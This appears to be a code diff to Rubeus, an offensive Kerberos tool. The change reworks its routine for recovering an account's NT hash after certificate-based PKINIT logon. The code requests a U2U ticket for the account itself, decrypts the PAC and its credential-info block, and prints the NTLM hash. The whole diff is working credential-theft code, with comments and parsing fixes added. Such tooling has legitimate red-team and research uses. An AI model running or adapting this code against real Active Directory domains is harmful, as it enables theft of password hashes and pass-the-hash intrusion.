@@ -572,8 +572,10 @@ namespace Rubeus {
                 LSA.DisplayTicket(kirbi);
             }
 
+            // If it was PKINIT authentication, try to retrieve the NT hash
             if (isPKINIT)
             {
+                // Issue a U2U authentication request for self
                 KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                 string dcIP = Networking.GetDCIP(info.prealm, false);
                 if (String.IsNullOrEmpty(dcIP)) { return null; }
@@ -587,12 +589,11 @@ namespace Rubeus {
                 }
 
                 // decode the supplied bytes to an AsnElt object
-                //  false == ignore trailing garbage
+                // false == ignore trailing garbage
                 AsnElt responseAsn2 = AsnElt.Decode(response, false);
 
                 // check the response value
                 int responseTag = responseAsn2.TagValue;
-
                 if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
                 {
                     // parse the response to an TGS-REP
@@ -603,10 +604,13 @@ namespace Rubeus {
                     AsnElt ae2 = AsnElt.Decode(outBytes2, false);
                     EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);
 
-                    var rawBytes = Crypto.KerberosDecrypt((Interop.KERB_ETYPE)encRepPart.key.keytype, 2, encRepPart.key.keyvalue, rep2.ticket.enc_part.cipher);
+                    // Decrypt the ticket's encrypted part to obtain the PAC
+                    var rawBytes = Crypto.KerberosDecrypt((Interop.KERB_ETYPE)encRepPart.key.keytype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, encRepPart.key.keyvalue, rep2.ticket.enc_part.cipher);
                     
+                    // Decode the encrypted part 
                     AsnElt ae3 = AsnElt.Decode(rawBytes, false);
 
+                    // Find the AuthorizationData element
                     foreach (AsnElt s in ae3.Sub[0].Sub)
                     {
                         if (s.TagValue != 10)
@@ -614,16 +618,33 @@ namespace Rubeus {
                             continue;
                         }
 
-                        AsnElt ad;
-                        for (ad = s; ad.Sub != null && ad.Sub.Length > 0; ad = ad.Sub[ad.Sub.Length - 1]) ;
-                        for (ad = AsnElt.Decode(ad.GetOctetString(), false); ad.Sub != null && ad.Sub.Length > 0; ad = ad.Sub[ad.Sub.Length - 1]) ;
-                        byte[] pac = ad.GetOctetString();
+                        // This is a shortcut - the PAC will be the last element
+                        AsnElt ad = s;
+                        byte[] pac;
 
+                        // The AsnElt library seems to fail to fully decode it, so this is a workaround
+                        while (true)
+                        {
+                            for (; ad.Sub != null && ad.Sub.Length > 0; ad = ad.Sub[ad.Sub.Length - 1]) ;
+                            pac = ad.GetOctetString();
+                            if (pac[0] == 0x30) // 0x30 is SEQUENCE in ASN.1
+                            {
+                                ad = AsnElt.Decode(pac, false);
+                            }
+                            else
+                            {
+                                break;
+                            }
+                        }
+
+                        // Decode the PAC
                         Stream stream = new MemoryStream(pac);
                         BinaryReader reader = new BinaryReader(stream);
 
                         uint length = reader.ReadUInt32();
                         uint version = reader.ReadUInt32();
+
+                        // Iterate over the PAC elements looking for PAC_CREDENTIAL_INFO
                         for (int i = 0; i < length; i++)
                         {
                             uint ulType = reader.ReadUInt32();
@@ -637,6 +658,7 @@ namespace Rubeus {
                             byte[] credentialInfo = new byte[cbBufferSize];
                             Array.Copy(pac, (int)offset, credentialInfo, 0, cbBufferSize);
 
+                            //Decode and decrypt PAC_CREDENTIAL_INFO
                             version = reader.ReadUInt32();
                             uint encryptionType = reader.ReadUInt32();
                             byte[] serializedData = new byte[cbBufferSize - 8];
@@ -644,28 +666,35 @@ namespace Rubeus {
 
                             byte[] decrypted = Crypto.KerberosDecrypt((Interop.KERB_ETYPE)encRepPart.key.keytype, 16, key, serializedData);
 
-                            int j;
-                            for (j = decrypted.Length - 1; decrypted[j] == 0; j--);
-                            string NTLM = "";
-                            while(decrypted[j] != 0)
-                            {
-                                NTLM = decrypted[j].ToString("X2") + NTLM;
-                                j--;
-                            }
 
-                            if (NTLM.Length == 32)
-                            {
-                                Console.WriteLine("[+] NT Hash: {0}", NTLM.ToLower());
-                            }
+                            // Shortcut number 2 because NDR is evil
 
+                            int j = 0;
+                            string NTLM;
+                            while (j < decrypted.Length)
+                            {
+                                for (; j < decrypted.Length && decrypted[j] == 0; j++); // Skip zeros
+
+                                // Capture a value
+                                NTLM = "";
+                                for (; j < decrypted.Length && decrypted[j] != 0; j++)
+                                {
+                                    NTLM += decrypted[j].ToString("X2");
+                                }
+
+                                // Is the value the right length for NTLM - may have false positives, but unlikely
+                                if (NTLM.Length == 32)
+                                {
+                                    Console.WriteLine("[+] NT Hash: {0}", NTLM.ToLower());
+                                    break;
+                                }
+                            }
                             break;
                         }
-
                         break;
                     }
                 }
             }
-
             return kirbiBytes;
         }
     }
